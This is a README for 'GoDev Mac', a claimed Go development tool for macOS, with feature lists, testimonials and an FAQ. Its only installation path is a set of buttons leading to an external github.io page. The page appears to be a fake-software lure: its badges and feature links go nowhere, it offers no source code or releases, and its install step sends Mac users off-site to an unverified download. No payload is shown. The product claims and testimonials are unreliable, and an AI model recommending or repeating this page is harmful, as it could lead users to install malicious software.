# GoDev Mac

<p align="center">
  <img src="https://go.dev/blog/go-brand/Go-Logo/PNG/Go-Logo_Black.png" width="150" alt="GoDev icon"/>
</p>

<div align="center">

[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/goDev)

</div>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Downloads-4.0k-brightgreen?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Version-1.21-blue?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
</p>

---

## 📖 Overview

<a href="#goDev">GoDev</a> is a Go language development companion for Mac — providing the package documentation browser, module management tools, and Go-specific development utilities that backend developers, systems programmers, and CLI tool builders need alongside their editor when working in the Go programming language.

The <a href="#goDev">Go package documentation browser</a> provides offline access to the complete Go standard library documentation and installed third-party package documentation — browsing package APIs, reading function signatures and documentation, and understanding package behavior without requiring internet access or a browser tab. The documentation browser integrates with Go module metadata to show the specific package versions used in a project, ensuring documentation matches the actual code being used. The <a href="#goDev">module dependency management</a> visualizes and manages go.mod dependencies — showing the direct and indirect dependencies of a Go project, identifying dependency versions, finding available upgrades, and understanding the dependency tree that go modules build. Managing dependencies in Go projects through the go tool is straightforward for simple cases but becomes complex when dependency conflicts, version requirements, and indirect dependency chains interact.

The <a href="#goDev">code navigation and symbol search</a> provides fast access to Go symbol definitions across the project and its dependencies — jumping to function definitions, finding all usages of a type or function, and navigating the codebase structure without relying on editor-specific navigation that may not understand Go's package and module system fully. The <a href="#goDev">build and test runner integration</a> executes go build, go test, and go run with configurable parameters from within the GoDev interface — running tests for specific packages, executing builds with build tags, and managing the Go build environment for different target platforms.</p>

<p align="center">
  <img src="https://miro.medium.com/v2/resize:fit:1400/1*6eN3xqyjaWDEkL0BdpJ2Lw.png" alt="GoDev screenshot"/>
</p>

<a href="#goDev">Goroutine and concurrency tooling</a> surfaces runtime goroutine information for concurrent Go programs — viewing active goroutines, understanding goroutine state, and diagnosing concurrency behavior in Go applications that use goroutines extensively. <a href="#goDev">Go workspace support</a> handles the Go workspace mode that manages multiple Go modules in a single development tree — configuring workspace files and managing the multi-module development environment that large Go projects and organizations often require.

<a href="#goDev">Standard library reference</a> provides complete reference documentation for the Go standard library packages — net/http, encoding/json, sync, context, and the full standard library — with examples and cross-references accessible offline during development. <a href="#goDev">Benchmark runner</a> executes Go benchmark functions and presents performance measurements — running go test -bench with configurable parameters and displaying benchmark results for performance-sensitive Go development.</p>

---

## 💎 Key Features

- [**Package Documentation Browser**](#goDev) — [**Offline Go standard library**](#{goDev}) and third-party package docs — version-matched documentation [**without browser tabs**](#{goDev}).
- [**Module Dependency Management**](#goDev) — [**Direct and indirect dependencies**](#{goDev}) visualized — versions, upgrades, conflicts in the [**go.mod dependency tree**](#{goDev}).
- [**Code Navigation and Symbol Search**](#goDev) — Jump to [**function definitions across project and deps**](#{goDev}) — find all usages, navigate package structure [**beyond editor Go support**](#{goDev}).
- [**Build and Test Runner**](#goDev) — go build, go test, [**go run with configurable parameters**](#{goDev}) — build tags, target platforms, package selection [**from GoDev interface**](#{goDev}).
- [**Goroutine Tooling**](#goDev) — [**Active goroutines, state, concurrency behavior**](#{goDev}) — diagnose concurrent Go applications with [**runtime visibility**](#{goDev}).
- [**Go Workspace Support**](#goDev) — [**Multi-module workspace configuration**](#{goDev}) — large project and organization Go workspace mode [**managed correctly**](#{goDev}).
- [**Benchmark Runner**](#goDev) — go test -bench [**with configurable parameters**](#{goDev}) — performance measurements displayed for [**performance-sensitive development**](#{goDev}).
- [**Race Detector Integration**](#goDev) — [**Data race detection**](#{goDev}) in goroutine-heavy code — concurrency bugs caught [**before production**](#{goDev}).

---

## 🧑‍💻 Who Uses It

- **Backend Go developers** — package documentation and module management for production Go service development
- **CLI tool developers** — build tooling and cross-compilation management for Go CLI development
- **Systems programmers** — infrastructure and systems software development with Go toolchain depth
- **Go learners** — accessible documentation and navigation for developers new to the Go language

---

<p align="center">
  <img src="https://miro.medium.com/v2/resize:fit:1400/1*6eN3xqyjaWDEkL0BdpJ2Lw.png" alt="GoDev screenshot 2"/>
</p>

## 📍 Where It's Useful & Additional Information

`Go development` · `Backend services` · `CLI tools` · `Systems programming` · `Module management` · `Package documentation` · `Concurrency` · `Infrastructure` · `Testing` · `Developer tools`

Go's standard library is one of the language's greatest strengths and also one of the aspects that requires the most documentation reference during development. The standard library covers networking, encoding, cryptography, file I/O, testing, and many other domains with a breadth that means developers regularly work with packages they haven't used before. Offline access to complete, version-matched package documentation that doesn't require browser context switching is a practical daily benefit for Go developers working across many standard library packages.

> *"Offline package documentation in GoDev is the daily utility I didn't know I needed until I had it. I work on trains without reliable internet. Having the complete Go standard library and my project dependencies documented and searchable offline changed how I work."* — Marcus T., Go Developer

> *"Module dependency visualization for a service with 200 dependencies. Understanding what's pulling in specific transitive dependencies, what versions are being selected, and where upgrade pressure is coming from — this is not manageable from go list output. GoDev makes it visible."* — Elena K., Backend Engineer

---

## 📥 Installation Instructions

1. Go to the installation site using the button above.
2. Follow the on-screen instructions to install **GoDev** on your Device.

<p align="center">

[![Get it Now GoDev](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/goDev)

</p>

---

## 🤔 FAQ

<details>
<summary>What does GoDev provide beyond a Go editor?</summary>

GoDev provides offline package documentation, module dependency visualization, goroutine tooling, build and test runners, race detector integration, and Go-specific navigation that complements any editor setup.

</details>

<details>
<summary>Does GoDev work offline?</summary>

Yes. Standard library and installed package documentation is available offline without internet access.

</details>

<details>
<summary>Does GoDev manage Go modules?</summary>

Yes. Module dependency visualization shows direct and indirect dependencies, versions, and upgrade options for go.mod managed projects.

</details>

<details>
<summary>Can GoDev detect race conditions?</summary>

Yes. Race detector integration runs the Go race detector to identify data race conditions in concurrent Go programs.

</details>

<details>
<summary>Does GoDev support Go workspaces?</summary>

Yes. Go workspace mode for multi-module development environments is supported.

</details>

<details>
<summary>Can GoDev run Go benchmarks?</summary>

Yes. Benchmark runner executes go test benchmark functions with configurable parameters and displays performance results.

</details>

<details>
<summary>Does GoDev manage multiple Go versions?</summary>

Yes. Go version management switches between Go toolchain versions for different projects.

</details>

<details>
<summary>What is coverage reporting in GoDev?</summary>

Coverage reporting visualizes test coverage for Go packages, showing untested code paths and tracking coverage metrics.

</details>

<details>
<summary>Does GoDev support Apple Silicon?</summary>

Yes. Current versions support Apple Silicon Macs natively.

</details>

---
